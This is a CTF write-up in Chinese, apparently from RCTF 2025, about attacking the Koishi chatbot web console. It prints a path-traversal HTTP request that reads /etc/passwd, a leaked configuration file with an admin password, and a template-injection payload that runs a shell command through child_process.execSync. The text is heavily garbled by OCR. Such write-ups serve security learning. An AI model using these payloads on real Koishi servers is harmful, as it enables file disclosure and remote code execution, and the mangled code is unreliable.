---
tags: [任意文件读取, 路径穿越, 配置文件泄露, RCE, Koishi, 越权]
---

# 514¦s_Heart

https://github.com/koishijs/webui/blob/main/plugins/console/src/node/index.ts

能任意文件读了

```
GET  /@plugin-77dvs1bw9wb/ …/ …/ …/ …/ …/ …/ …/etc/passwd  HTTP/1.1
Host :  127 .0 .0 .1:5140
sec-ch-ua :  "Not=A?Brand " ;v= "24 " ,  "Chromium " ;v= "140 "
sec-ch-ua-mobile :  ?0
sec-ch-ua-platform :  "macOS "
Accept-Language :  zh-CN ,zh;q=0 .9
Upgrade-Insecure-Requests :  1
User-Agent :  Mozilla/5 .0  (Windows  NT  10 .0 ;  Win64 ;  x64)  AppleWebKit/537 .36 (KHTML ,  like  Gecko)  Chrome/131 .0 .6778 .86  Safari/537 .36
Accept :
text/html ,application/xhtml+xml ,application/xml;q=0 .9 ,image/avif ,image/webp ,im age/apng ,*片;q=0 .8 ,application/signed-exchange;v=b3;q=0 .7
Sec-Fetch-Site :  none
Sec-Fetch-Mode :  navigate
Sec-Fetch-User :  ?1
Sec-Fetch-Dest :  document
Accept-Encoding :  gzip ,  deflate ,  br
Connection :  keep-alive
```

这个是低权限用户， 读不了flag

读配置文件， 拿到密码， 要后台找个接口rce了

```
plugins :
group :server :
server:yrt4za :
port :  5140
maxPort :  5149
host :  0 .0 .0 .0
~server-satori:4a5c8c :  {}
~server-temp:in16cp :  {}
group:basic :
~admin:tnisa7 :  {}
~bind:07uqcj :  {}
commands :fcfz9r :  {}
help:tj2694 :  {}
http:c3980a:  {}
~inspect:bep4w8 :  {}
locales:10cpca :  {}
proxy-agent:9hjj24 :  {}

rate-limit :9enlml :  {}
telemetry :c46z2c :  {}
group :console :
actions:12nvqa :  {}
analytics:j8afpj :  {}
android :bo77l9 :
$if :  env .KOISHI_AGENT ?includes('Android ') auth:hfi7d9 :
admin :
hint :  ×
as  you  can  see ,  you  now  get  the  password  of  admin ,  try  to  rce without
adding  any  plugins !  gogogo !  (The  container  network  has  been
restricted .  Please  do  not  attempt  any  supply  chain  attacks .  Let ’s work
together  to  maintain  the  security  of  the  Koishi  community.) password :  rctf2025gogogotorce
config :ab6k8s :  {}
console:n2unsp :
open :  false
dataview:b4re4p :  {}
desktop:zvr0sy :
$if :  env .KOISHI_AGENT ?includes('Desktop ') explorer:e6ctyv :  {}
logger:6t5evk :  {}
insight:blbpmd :  {}
market:734ssq :
search :
endpoint:  <https:Ⅱregistry.koishi.chat/index.json>
notifier:fjhc7z :  {}
oobe:pblvay :  {}
sandbox:a8395u :  {}
status:mgd9ai :  {}
theme-vanilla :zw7dvu :  {}
group:storage :
~database-mongo:e4iopx :
database :  koishi
~database-mysql:sqfsc4 :
database :  koishi
~database-postgres:yixoph :
database :  koishi
database-sqlite:l9px0e :
path :  data/koishi .db assets-local:9psdxd :  {}
group:adapter :
~adapter-dingtalk :nt9ml6 :  {}
~adapter-discord :cm64td :

token :  null
~adapter-kook:x2laqr :  {}  ~adapter-lark:93xiqh :  {}  ~adapter-line:zwdbcy :  {}  ~adapter-mail:1yn601 :  {}  ~adapter-matrix:ptr0p2 :  {} ~adapter-qq:zte6li :  {}
~adapter-satori:wqcyyw :  {}
~adapter-slack:sfuj rd :  {}
~adapter-telegram:lffgys :  {}
~adapter-wechat-official:k7ypgi :  {} ~adapter-wecom:2lxd3k :  {}
~adapter-whatsapp:k4wpu1 :  {}
~adapter-zulip:gdig38 :  {} group:develop :
$if :  env .NODE_ENV  =   'development ' hmr:s1k6y8 :
root :  .

```

https://koishi.chat/zh-CN/guide/develop/config.html#使用环境变量

![img](file:///C:\Users\87701\AppData\Local\Temp\ksohtml172612\wps29.jpg)[https://github.com/koishijs/koishi/blob/cbc18a1d1a240ab96704dc04bcb30ad080e25a96/pack](https://github.com/koishijs/koishi/blob/cbc18a1d1a240ab96704dc04bcb30ad080e25a96/packages/loader/src/shared.ts#L325)[ ](https://github.com/koishijs/koishi/blob/cbc18a1d1a240ab96704dc04bcb30ad080e25a96/packages/loader/src/shared.ts#L325)[ages/loader/src/shared.ts#L325](https://github.com/koishijs/koishi/blob/cbc18a1d1a240ab96704dc04bcb30ad080e25a96/packages/loader/src/shared.ts#L325)

过滤器模版注入,然后外带信息就好了

```
$弋  process .mainModule .require('child_process ') .execSync('/readflag  >
/koishi/flag ')  B
```

